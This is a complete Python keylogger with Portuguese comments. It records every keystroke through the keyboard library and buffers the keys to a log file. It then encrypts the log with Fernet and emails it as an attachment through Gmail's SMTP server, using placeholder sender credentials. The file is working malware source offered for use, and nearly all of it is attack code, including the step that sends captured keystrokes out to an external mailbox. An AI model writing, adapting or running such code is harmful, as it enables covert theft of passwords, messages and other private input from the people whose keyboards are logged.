import keyboard              # Captura de teclas
import threading             # Execução paralela
import time                  # Controle de tempo
from queue import Queue      # Buffer de teclas
from cryptography.fernet import Fernet  # Criptografia simétrica
import smtplib               # Envio de e-mail
import ssl                   # Segurança SSL
from email.message import EmailMessage  # Composição de e-mail
import os                    # Manipulação de arquivos

# ====== CONFIGURAÇÕES ======

CAMINHO_LOG = "log.txt"                  # Arquivo de log temporário
CAMINHO_LOG_CRIPTO = "log_encrypted.txt" # Arquivo criptografado
CAMINHO_CHAVE = "chave.key"              # Chave de criptografia

EMAIL_REMETENTE = "seuemail@gmail.com"
EMAIL_SENHA = "senha de app do seu email"
EMAIL_DESTINATARIO = "seuemail@gmail.com"

INTERVALO_GRAVACAO = 5  # segundos entre gravações do buffer

# ====== BUFFER DE TECLAS ======

fila = Queue()  # Fila para armazenar teclas antes de gravar

# Função que grava o conteúdo do buffer no arquivo de log
def gravar_buffer():
    while True:
        if not fila.empty():
            with open(CAMINHO_LOG, "a", encoding="utf-8") as f:
                while not fila.empty():
                    tecla = fila.get()
                    f.write(tecla)
        time.sleep(INTERVALO_GRAVACAO)

# ====== CAPTURA DE TECLAS ======

# Função chamada a cada tecla pressionada
def capturar_tecla(evento):
    nome = evento.name
    if nome == "space":
        fila.put(" ")
    elif nome == "enter":
        fila.put("\n")
    elif nome == "tab":
        fila.put("\t")
    elif nome == "backspace":
        fila.put(" [BACKSPACE] ")
    elif len(nome) == 1:
        fila.put(nome)
    else:
        fila.put(f"[{nome}] ")

# ====== CRIPTOGRAFIA ======

def gerar_chave():
    if not os.path.exists(CAMINHO_CHAVE):
        chave = Fernet.generate_key()
        with open(CAMINHO_CHAVE, "wb") as f:
            f.write(chave)

def carregar_chave():
    with open(CAMINHO_CHAVE, "rb") as f:
        return f.read()

def criptografar_log():
    chave = carregar_chave()
    fernet = Fernet(chave)

    with open(CAMINHO_LOG, "rb") as f:
        dados = f.read()

    dados_criptografados = fernet.encrypt(dados)

    with open(CAMINHO_LOG_CRIPTO, "wb") as f:
        f.write(dados_criptografados)

# ====== ENVIO POR EMAIL ======

def enviar_email():
    msg = EmailMessage()
    msg["Subject"] = "Log criptografado"
    msg["From"] = EMAIL_REMETENTE
    msg["To"] = EMAIL_DESTINATARIO
    msg.set_content("Segue em anexo o log criptografado.")

    with open(CAMINHO_LOG_CRIPTO, "rb") as f:
        conteudo = f.read()
        msg.add_attachment(conteudo, maintype="application", subtype="octet-stream", filename="log_encrypted.txt")

    contexto = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=contexto) as servidor:
        servidor.login(EMAIL_REMETENTE, EMAIL_SENHA)
        servidor.send_message(msg)

# ====== EXECUÇÃO PRINCIPAL ======

if __name__ == "__main__":
    gerar_chave()  # Garante que a chave exista

    # Inicia a thread que grava o buffer periodicamente
    threading.Thread(target=gravar_buffer, daemon=True).start()

    # Inicia a escuta de teclas
    keyboard.on_press(capturar_tecla)

    try:
        keyboard.wait()  # Mantém o programa rodando até ser interrompido
    except KeyboardInterrupt:
        pass  # Permite encerrar com Ctrl+C

    # Após encerramento, criptografa e envia o log
    criptografar_log()

    enviar_email()
